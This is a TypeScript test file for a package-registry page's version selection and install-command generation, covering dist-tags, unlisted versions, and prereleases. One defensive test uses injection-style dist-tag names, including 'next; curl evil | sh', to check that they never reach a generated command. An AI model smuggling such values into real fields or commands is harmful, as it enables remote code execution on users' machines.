// Launch QA finding: /package/react?v=19.1.0 showed 19.3.1, because 19.1.0 is older than the newest 200 versions the
// package answer lists and the page fell back to latest. Now a version the list does not hold is asked of the
// registry's per-version endpoint, and a version string that can't exist says "no such version" without a read.
import { describe, expect, test } from "bun:test";
import { shownOf } from "./early-answer";
import { chooseVersion, rowsWith, selectVersion, sharedDefault } from "./shown-version";
import type { Fetched, VersionDetails } from "./registry";
import { installCommand } from "./install-note";
import { unscoredNotice } from "./unscored";
import { pkg } from "./agent/testing";

describe("which version ?v= shows", () => {
  const answer = pkg({ distTags: { latest: "1.3.0", legacy: "1.2.0", old: "0.9.0" } });

  test("no ?v= is latest", () => {
    expect(chooseVersion({ pkg: answer, asked: undefined })).toEqual({ kind: "latest", version: "1.3.0", tag: null });
  });

  test("a listed version is shown without another read", () => {
    expect(chooseVersion({ pkg: answer, asked: "1.2.0" })).toEqual({ kind: "listed", version: "1.2.0" });
  });

  test("a dist-tag shows the version it names, listed or not", () => {
    expect(chooseVersion({ pkg: answer, asked: "legacy" })).toEqual({ kind: "listed", version: "1.2.0" });
    expect(chooseVersion({ pkg: answer, asked: "old" })).toEqual({ kind: "unlisted", version: "0.9.0" });
  });

  test("a version number the list does not hold is asked of the per-version endpoint, not replaced by latest", () => {
    expect(chooseVersion({ pkg: answer, asked: "0.1.0" })).toEqual({ kind: "unlisted", version: "0.1.0" });
    expect(chooseVersion({ pkg: answer, asked: "19.3.0-canary-f6a48828-20251019" })).toEqual({ kind: "unlisted", version: "19.3.0-canary-f6a48828-20251019" });
  });

  test("a string that is neither a version nor a dist-tag is no such version, with no read", () => {
    expect(chooseVersion({ pkg: answer, asked: "banana" })).toEqual({ kind: "invalid", asked: "banana" });
    expect(chooseVersion({ pkg: answer, asked: "1.2" })).toEqual({ kind: "invalid", asked: "1.2" });
    expect(chooseVersion({ pkg: answer, asked: "constructor" })).toEqual({ kind: "invalid", asked: "constructor" });
  });

  test("an unlisted version found by the per-version endpoint is active or withheld as that answer says", () => {
    expect(shownOf(rowsWith(answer.versions, { version: "0.1.0", status: "active" }), "0.1.0")).toEqual({ version: "0.1.0", status: "active" });
    expect(shownOf(rowsWith(answer.versions, { version: "0.1.0", status: "revoked" }), "0.1.0")).toEqual({ version: "0.1.0", status: "withheld" });
    // without that row it stays unknown, which makes the page read its answers again (early-answer.ts)
    expect(shownOf(rowsWith(answer.versions, null), "0.1.0")).toEqual({ version: "0.1.0", status: "unknown" });
  });

  test("an unlisted version apm can never score says why, from the per-version answer", () => {
    const rows = rowsWith(answer.versions, { version: "0.1.0", status: "active", unscorable: "apm cannot open this tarball" });
    const notice = unscoredNotice({ pkg: { ...answer, versions: rows }, version: "0.1.0" });

    expect(notice.kind).toBe("unscorable");
    expect(notice.text).toStartWith("apm cannot open this tarball. ");
  });
});

// HOME-502 D15/D16: a package with only a prerelease tagged next showed "n/a" and untagged install commands
describe("a package with no latest tag", () => {
  const row = (version: string, publishedAt: string) => ({ version, publishedAt, publishedBy: "me", status: "active", statusReason: null, deprecated: null, score: 100, grade: "A" });
  const prerelease = pkg({ latest: null, score: null, distTags: { next: "0.0.2-test.2", beta: "0.0.1-test.1" }, versions: [row("0.0.2-test.2", "2026-11-25T19:00:00.000Z"), row("0.0.1-test.1", "2026-11-24T19:00:00.000Z")] });

  test("shows the newest version a tag names, with that tag", () => {
    expect(chooseVersion({ pkg: prerelease, asked: undefined })).toEqual({ kind: "latest", version: "0.0.2-test.2", tag: "next" });
  });

  test("a package with latest shows it; one with no tag on any version has no default", () => {
    expect(chooseVersion({ pkg: pkg(), asked: undefined })).toEqual({ kind: "latest", version: "1.3.0", tag: null });
    expect(chooseVersion({ pkg: pkg({ latest: null, distTags: {} }), asked: undefined })).toEqual({ kind: "none" });
  });
});


// HOME-502 Sol review findings 1, 5 and 8: the default page offered an install with nothing to install, ?v=next and an
// exact version installed differently from the default, and a share named another release's grade
describe("the selection the page and its Markdown view share", () => {
  type Row = ReturnType<typeof pkg>["versions"][number];

  const row = (version: string, over: Partial<Row> = {}): Row => ({ version, publishedAt: "2026-11-25T19:00:00.000Z", publishedBy: "me", status: "active", statusReason: null, deprecated: null, score: 100, grade: "A", ...over });
  const prerelease = pkg({ latest: null, score: null, distTags: { next: "0.0.2-test.2" }, versions: [row("0.0.2-test.2", { score: 92, grade: "A" })] });

  const noRead = async (): Promise<Fetched<VersionDetails>> => {
    throw new Error("a listed version needs no read");
  };

  test("the default, ?v=<tag> and an exact version: by the tag, by the tag, pinned", async () => {
    expect(await selectVersion({ pkg: prerelease, asked: undefined, read: noRead })).toEqual({ kind: "shown", version: "0.0.2-test.2", install: { kind: "tag", tag: "next" }, read: null });
    expect(await selectVersion({ pkg: prerelease, asked: "next", read: noRead })).toEqual({ kind: "shown", version: "0.0.2-test.2", install: { kind: "tag", tag: "next" }, read: null });
    expect(await selectVersion({ pkg: prerelease, asked: "0.0.2-test.2", read: noRead })).toEqual({ kind: "shown", version: "0.0.2-test.2", install: { kind: "exact", version: "0.0.2-test.2" }, read: null });
    expect(await selectVersion({ pkg: pkg(), asked: "latest", read: noRead })).toEqual({ kind: "shown", version: "1.3.0", install: { kind: "default", version: "1.3.0" }, read: null });
  });

  test("a tagged default outside the listed rows is read from the per-version endpoint, not dropped", async () => {
    const old = pkg({ latest: null, score: null, distTags: { next: "0.0.1" }, versions: [row("0.0.2", { status: "yanked" })] });
    const details: VersionDetails = { version: "0.0.1", status: "active", statusReason: null, deprecated: null, facts: null, score: null, unscorable: null };
    const asked: string[] = [];
    const selected = await selectVersion({ pkg: old, asked: undefined, read: async (version) => (asked.push(version), { kind: "ok", value: details }) });

    expect(asked).toEqual(["0.0.1"]);
    expect(selected).toEqual({ kind: "shown", version: "0.0.1", install: { kind: "tag", tag: "next" }, read: details });
  });

  test("latest yanked: the default is still the published latest, which the page then says not to install", async () => {
    const yankedLatest = pkg({ latest: "2.0.0", distTags: { latest: "2.0.0", next: "1.9.0" }, versions: [row("2.0.0", { status: "yanked" }), row("1.9.0", { publishedAt: "2026-11-24T00:00:00.000Z" })] });

    expect(await selectVersion({ pkg: yankedLatest, asked: undefined, read: noRead })).toEqual({ kind: "shown", version: "2.0.0", install: { kind: "default", version: "2.0.0" }, read: null });
  });

  test("nothing published, or no tag on an active version: nothing to show by name", async () => {
    expect(await selectVersion({ pkg: pkg({ latest: null, distTags: {}, versions: [] }), asked: undefined, read: noRead })).toEqual({ kind: "none", why: { kind: "unpublished" } });
    expect(await selectVersion({ pkg: pkg({ latest: null, distTags: {}, versions: [row("1.0.0")] }), asked: undefined, read: noRead })).toEqual({ kind: "none", why: { kind: "untagged" } });
  });

  test("a share names the default the page shows, with that version's own score", () => {
    expect(sharedDefault(prerelease)).toEqual({ version: "0.0.2-test.2", score: { score: 92, grade: "A" } });
    expect(sharedDefault(pkg())).toEqual({ version: "1.3.0", score: { score: 75, grade: "B" } });
    expect(sharedDefault(pkg({ latest: null, distTags: {}, versions: [] }))).toEqual({ version: null, score: null });
  });
});

// HOME-502 Sol review of b1a3a1c, finding 3: an off-list tag lost to an older listed one without a read. Tags are the
// published dist-tags: a command names a tag (bare for latest) only when that tag names the version shown.
describe("published tags and tag targets the list does not hold", () => {
  type Row = ReturnType<typeof pkg>["versions"][number];

  const row = (version: string, over: Partial<Row> = {}): Row => ({ version, publishedAt: "2026-01-01T00:00:00.000Z", publishedBy: "me", status: "active", statusReason: null, deprecated: null, score: 90, grade: "A", ...over });
  const details = (version: string, publishedAt: string): VersionDetails => ({ version, status: "active", statusReason: null, deprecated: null, facts: null, score: null, unscorable: null, publishedAt });

  const noRead = async (): Promise<Fetched<VersionDetails>> => {
    throw new Error("a listed version needs no read");
  };

  test("react's tags: latest by name, next by its tag, a version number pinned", async () => {
    const p = pkg({ latest: "19.3.1", distTags: { latest: "19.3.1", next: "19.3.0-canary-d5736f09-20260507", backport: "19.1.10" }, versions: [row("19.3.1"), row("19.3.0-canary-d5736f09-20260507"), row("19.1.10")] });
    const selected = await selectVersion({ pkg: p, asked: undefined, read: noRead });

    expect(selected).toEqual({ kind: "shown", version: "19.3.1", install: { kind: "default", version: "19.3.1" }, read: null });

    if (selected.kind !== "shown") return;
    expect(installCommand({ client: "apm", name: "react", install: selected.install })).toBe("apm add react");
    expect(await selectVersion({ pkg: p, asked: "next", read: noRead })).toMatchObject({ install: { kind: "tag", tag: "next" } });
    expect(await selectVersion({ pkg: p, asked: "backport", read: noRead })).toMatchObject({ install: { kind: "tag", tag: "backport" } });
    expect(await selectVersion({ pkg: p, asked: "19.1.10", read: noRead })).toMatchObject({ install: { kind: "exact", version: "19.1.10" } });
  });

  test("a tag that is not a plain name never reaches a command: the version is pinned", async () => {
    const p = pkg({ latest: "1.3.0", distTags: { latest: "1.3.0", "x;rm": "1.2.0", "a'b": "1.2.0" }, versions: [row("1.3.0"), row("1.2.0")] });

    for (const tag of ["x;rm", "a'b"]) {
      const selected = await selectVersion({ pkg: p, asked: tag, read: noRead });

      expect(selected).toEqual({ kind: "shown", version: "1.2.0", install: { kind: "exact", version: "1.2.0" }, read: null });

      if (selected.kind !== "shown") return;
      expect(installCommand({ client: "npm", name: "left-pad", install: selected.install })).toBe("npm install left-pad@1.2.0");
    }

    const onlyHostile = pkg({ latest: null, score: null, distTags: { "next; curl evil | sh": "0.1.0" }, versions: [row("0.1.0")] });

    expect(await selectVersion({ pkg: onlyHostile, asked: undefined, read: noRead })).toMatchObject({ version: "0.1.0", install: { kind: "exact", version: "0.1.0" } });
  });

  test("tag targets the list does not hold: only the highest three are read, whatever the tag count", async () => {
    const tags = Object.fromEntries(["1.0.0", "2.0.0", "3.0.0-rc.1", "3.0.0", "10.0.0", "9.1.0"].map((v, i) => [`t${i}`, v]));
    const p = pkg({ latest: null, score: null, distTags: { ...tags, again: "10.0.0" }, versions: [row("0.1.0", { status: "yanked" })] });
    const asked: string[] = [];

    await selectVersion({ pkg: p, asked: undefined, read: async (version) => (asked.push(version), { kind: "ok", value: details(version, "2026-01-01T00:00:00.000Z") }) });
    expect(asked.toSorted()).toEqual(["10.0.0", "3.0.0", "9.1.0"]);
  });

  test("a prerelease tagged latest installs by name, as the published tag says", async () => {
    const p = pkg({ latest: "0.9.0-beta.1", distTags: { latest: "0.9.0-beta.1" }, versions: [row("0.9.0-beta.1")] });

    expect(await selectVersion({ pkg: p, asked: undefined, read: noRead })).toMatchObject({ install: { kind: "default", version: "0.9.0-beta.1" } });
  });

  test("with no installable latest, a newer off-list next beats an older listed beta, and the other way round", async () => {
    const p = pkg({ latest: null, score: null, distTags: { beta: "0.5.0", next: "0.6.0" }, versions: [row("0.5.0", { publishedAt: "2026-03-01T00:00:00.000Z" })] });
    const asked: string[] = [];
    const newer = await selectVersion({ pkg: p, asked: undefined, read: async (version) => (asked.push(version), { kind: "ok", value: details(version, "2026-06-01T00:00:00.000Z") }) });

    expect(asked).toEqual(["0.6.0"]);
    expect(newer).toMatchObject({ kind: "shown", version: "0.6.0", install: { kind: "tag", tag: "next" } });

    const older = await selectVersion({ pkg: p, asked: undefined, read: async (version) => ({ kind: "ok", value: details(version, "2025-06-01T00:00:00.000Z") }) });

    expect(older).toEqual({ kind: "shown", version: "0.5.0", install: { kind: "tag", tag: "beta" }, read: null });
  });

  test("all targets off-list: published last wins, not the highest version string", async () => {
    const p = pkg({ latest: null, score: null, distTags: { a: "9.0.0", b: "1.0.0" }, versions: [row("0.1.0", { status: "yanked" })] });

    const when = new Map([
      ["9.0.0", "2025-01-01T00:00:00.000Z"],
      ["1.0.0", "2026-01-01T00:00:00.000Z"],
    ]);

    expect(await selectVersion({ pkg: p, asked: undefined, read: async (version) => ({ kind: "ok", value: details(version, when.get(version) ?? "") }) })).toMatchObject({ version: "1.0.0", install: { kind: "tag", tag: "b" } });
  });
});
